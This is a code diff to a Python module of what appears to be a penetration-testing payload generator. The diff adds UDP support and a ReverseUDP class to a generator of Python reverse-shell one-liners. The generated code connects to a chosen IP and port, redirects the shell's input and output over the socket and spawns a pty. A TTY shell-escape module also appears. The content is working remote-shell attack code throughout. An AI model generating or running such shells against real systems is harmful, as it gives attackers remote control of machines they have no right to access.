@@ -28,12 +28,17 @@ class ReverseTCP(plugin.ReverseShell):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
+        self.extension = "py"
+        self.set_write_file()
         self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
-        self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
+        if self.is_udp:
+            self.shell += f"""socket.SOCK_DGRAM);s.connect(("{self.args.ip}",{self.args.port}));"""
+        else:
+            self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
         self.shell += """os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(), 2);"""
         if self.args.exec == "pty":
             self.shell += f"""import pty;pty.spawn("{self.args.shell}")'"""
@@ -63,5 +68,13 @@ class TTY(plugin.Module):
         self.opts.description = "[TTYShell] Python TTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
+
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""
+
+
+class ReverseUDP(ReverseTCP):
+    def __init__(self):
+        super().__init__()
+        self.is_udp = True
+        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
